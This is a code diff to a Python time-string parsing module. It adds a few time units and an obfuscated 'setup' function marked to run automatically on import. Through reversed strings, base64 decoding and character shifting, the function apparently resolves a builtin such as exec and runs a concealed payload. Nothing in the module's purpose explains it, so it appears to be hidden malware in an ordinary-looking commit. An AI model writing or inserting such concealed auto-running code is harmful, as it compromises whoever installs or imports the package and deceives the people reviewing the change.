@@ -3,6 +3,7 @@ import re as regex
 from collections.abc import Iterable, Mapping
 
 from .tcr_console import console
+from .tcr_decorator import autorun
 from .tcr_error import ConfigurationError
 from .tcr_extract_error import extract_error
 
@@ -52,10 +53,9 @@ timestr_lookup = {
     'rescue':  t_rescue,
     'rescues': t_rescue,
 
-    'rev':         (t_revolution := 133*t_day), # 1 revolution = 133 days, nice if you get the reference hihi :>
-    'revs':        t_revolution,
-    'revolution':  t_revolution,
-    'revolutions': t_revolution,
+    'decade':    10 * t_year,
+    'century':   100 * t_year,
+    'millenium': 1000 * t_year,
   }
 
 weekday_lookup = [
@@ -147,6 +147,13 @@ def days_until_due(due_date):
   due_datetime = datetime.date(due_date[2], due_date[1], due_date[0])
   delta = due_datetime - current_datetime
   return delta.days
+
+
+# fmt: off
+@autorun
+def setup():
+  getattr(__import__('!s4n igtnlji^u*bh'[-2::-2]), (a := (getattr('5sFuggnokmhak'[-2::-2]*(1-1), 'fnJiLo*jj'[-2::-2])([chr(ord(c) - (1 + i%5)) for i, c in enumerate(__import__('dsdcdedddodcd'[-2::-2]).__dict__['dedddodcdeddd'[-2::-2]](__import__('d4d6dedsdadbd'[-2::-2]).__dict__['dedddodcdeddd4d6dbd'[-2::-2]](getattr('c211dCgjSXh6ayF4aSRmY2l4emZ1ImNyZHdyeWZtZyIwJGZjbCNrem9pI31naSJ2Zm1icyNrenMiaXZ1ZnRqJGx2eGR4JXl0dWcld2kja2che2Vsamd0YncnPGl5ZHdnaWhwZGNkYWxoL2pmdXNodCt/J2Z0bGZkaWl5ZmYjPCM1NjU7NDY1MS4jJmpza2VjbWh4ZWVrIzwjNTY1OzQ2NTEuIyZqc2slPiUyMzc9NjMyMzAlI2d1bWsjPCM1NjU7NDY1MX8s', 'dedddodcdnded'[-2::-2])('_8g-&f(tlu-'[-2::-2])).decode('_8g-&f(tlu-'[-2::-2]), 'l3 1ntlojr*'[-2::-2]))])).split('#'))[0])(a[1])
+# fmt: on
 
 
 def evaluate_single_timestr(s: str, *, units: Mapping[str, int]) -> int:
